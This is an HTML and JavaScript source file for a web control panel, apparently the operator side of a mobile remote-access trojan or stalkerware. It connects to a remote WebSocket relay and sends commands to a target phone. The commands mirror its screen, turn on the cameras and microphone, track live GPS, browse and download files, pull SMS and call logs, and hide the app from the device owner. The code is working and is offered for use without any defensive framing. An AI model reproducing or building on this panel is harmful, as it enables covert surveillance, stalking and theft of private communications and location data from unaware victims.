<!DOCTYPE html>
<html>
<head>
<title>SystemSync ELITE Console</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

<style>

/* ===== GLOBAL ===== */

body{
    margin:0;
    font-family:'Segoe UI',sans-serif;
    background:#f4f7fb;
    display:flex;
    height:100vh;
}

/* ===== SIDEBAR ===== */

#sidebar{
    width:280px;
    background:#ffffff;
    border-right:1px solid #e1e6ef;
    padding:20px;
    overflow-y:auto;
}

.logo{
    font-size:20px;
    font-weight:700;
    color:#007aff;
    margin-bottom:25px;
}

/* Buttons */

button{
    width:100%;
    padding:11px;
    margin:6px 0;
    border-radius:8px;
    border:none;
    background:#eef3fb;
    cursor:pointer;
    font-weight:600;
}

button:hover{
    background:#007aff;
    color:white;
}

/* ===== MAIN ===== */

#main{
    flex:1;
    display:flex;
    flex-direction:column;
}

/* HEADER */

#header{
    height:65px;
    background:white;
    border-bottom:1px solid #e1e6ef;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 25px;
}

.status{
    padding:6px 14px;
    border-radius:20px;
    background:#e6f7ec;
    color:#0a8f3c;
    font-weight:600;
}

/* ===== SINGLE OUTPUT PANEL ===== */

#panel{
    flex:1;
    margin:20px;
    background:white;
    border-radius:16px;
    box-shadow:0 8px 30px rgba(0,0,0,.05);
    overflow:hidden;
    display:flex;
    flex-direction:column;
}

/* VIDEO AREA */

#videoArea{
    height:320px;
    background:#000;
    display:flex;
    align-items:center;
    justify-content:center;
}

video, img{
    width:100%;
    height:100%;
    object-fit:contain;
}

/* DATA AREA */

#dataArea{
    flex:1;
    overflow:auto;
    padding:15px;
}

/* FILE STYLE */

.file{
    padding:10px;
    border-bottom:1px solid #eee;
    display:flex;
    justify-content:space-between;
}

/* Map */

#map{
    height:350px;
    border-radius:10px;
}

</style>
</head>

<body>

<!-- SIDEBAR -->

<div id="sidebar">

<div class="logo">SYSTEMSYNC</div>

<button onclick="startScreen()">üñ• Screen Mirror</button>
<button onclick="stopScreen()">‚èπ Stop Screen</button>
<button onclick="send('camFront')">üìπ Front Camera</button>
<button onclick="send('camBack')">üìπ Back Camera</button>
<button onclick="send('getLocation')">üìç Live GPS</button>
<button onclick="send('startAudio')">üé§ Start Mic</button>
<button onclick="send('stopAudio')">‚èπ Stop Mic</button>

<hr>

<button onclick="send('ls root')">üìÇ File Manager</button>
<button onclick="send('getSMS inbox')">üí¨ SMS Logs</button>
<button onclick="send('getCallLogs')">üìû Call Logs</button>

<hr>

<button onclick="send('hideApp')">üëª Hide App</button>
<button onclick="send('showApp')">üëÅ Show App</button>

</div>

<!-- MAIN -->

<div id="main">

<div id="header">
<div><b>ELITE CONTROL</b></div>
<div id="status" class="status">CONNECTING...</div>
</div>

<!-- üî• ONE PANEL ONLY -->

<div id="panel">

<div id="videoArea">
<div>No Media</div>
</div>

<div id="dataArea"></div>

</div>

</div>


<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>

const WS_URL="wss://mirror-view.onrender.com";

let ws;
let pc;
let mapInstance=null;

// CONNECT
function connect(){

ws=new WebSocket(WS_URL);

ws.onopen=()=>{
ws.send("I_AM_WEB");
setStatus("ONLINE");
};

ws.onclose=()=>{
setStatus("OFFLINE");
setTimeout(connect,4000);
};

ws.onmessage=(e)=>{

const msg=e.data;

if(msg.startsWith("LOC_DATA:")){
renderMap(JSON.parse(msg.substring(9)));
}

else if(msg.startsWith("FILE_LIST:")){
renderFiles(JSON.parse(msg.substring(10)));
}

else if(msg.startsWith("SMS_DATA:")){
renderRaw(JSON.parse(msg.substring(9)));
}

else if(msg.startsWith("CALL_DATA:")){
renderRaw(JSON.parse(msg.substring(10)));
}

else if(msg.startsWith("CAMERA_IMAGE:")){
showImage(msg.substring(13));
}

else if(msg.startsWith("RTC_OFFER:screen:")){
handleOffer(msg.substring(17));
}

else if(msg.startsWith("ICE_CANDIDATE:")){
handleIce(msg.substring(14));
}

};

}

function setStatus(t){
document.getElementById("status").innerText=t;
}

// COMMAND
function send(cmd){
if(ws.readyState===1) ws.send(cmd);
}

// ---------- VIDEO ----------

function showImage(b64){
document.getElementById("videoArea").innerHTML=
`<img src="data:image/jpeg;base64,${b64}">`;
}

// ---------- MAP ----------

function renderMap(data){

document.getElementById("dataArea").innerHTML=`<div id="map"></div>`;

if(mapInstance) mapInstance.remove();

setTimeout(()=>{

mapInstance=L.map('map').setView([data.lat,data.lon],18);

L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png')
.addTo(mapInstance);

L.marker([data.lat,data.lon]).addTo(mapInstance);

},200);

}

// ---------- FILES ----------

function renderFiles(files){

let html="";

files.forEach(f=>{

html+=`
<div class="file">
<div>${f.isDir?'üìÅ':'üìÑ'} ${f.name}</div>
<button onclick="send('${f.isDir?'ls ':'dl '}${f.path}')">
${f.isDir?'OPEN':'DL'}
</button>
</div>`;
});

document.getElementById("dataArea").innerHTML=html;

}

// RAW JSON DISPLAY (SMS / CALL)

function renderRaw(data){

document.getElementById("dataArea").innerHTML=
`<pre>${JSON.stringify(data,null,2)}</pre>`;

}

// ---------- SCREEN SHARE ----------

function startScreen(){
send('START_SCREEN_SHARE');
}

function stopScreen(){

send('STOP_SCREEN_SHARE');

if(pc){
pc.close();
pc=null;
}

document.getElementById("videoArea").innerHTML="No Media";

}

function handleOffer(sdp){

if(!pc){

pc=new RTCPeerConnection({
iceServers:[{urls:'stun:stun.l.google.com:19302'}]
});

pc.ontrack=(e)=>{
document.getElementById("videoArea").innerHTML=
'<video id="remoteVideo" autoplay playsinline></video>';

document.getElementById("remoteVideo").srcObject=e.streams[0];
};

pc.onicecandidate=(e)=>{
if(e.candidate){
ws.send('ICE_CANDIDATE:'+JSON.stringify(e.candidate));
}
};

}

pc.setRemoteDescription(
new RTCSessionDescription({type:'offer',sdp})
)
.then(()=>pc.createAnswer())
.then(a=>pc.setLocalDescription(a))
.then(()=>{
ws.send('ANSWER:'+pc.localDescription.sdp);
});

}

function handleIce(c){
if(!pc) return;
pc.addIceCandidate(new RTCIceCandidate(JSON.parse(c)));
}

// INIT
connect();

</script>
</body>
</html>
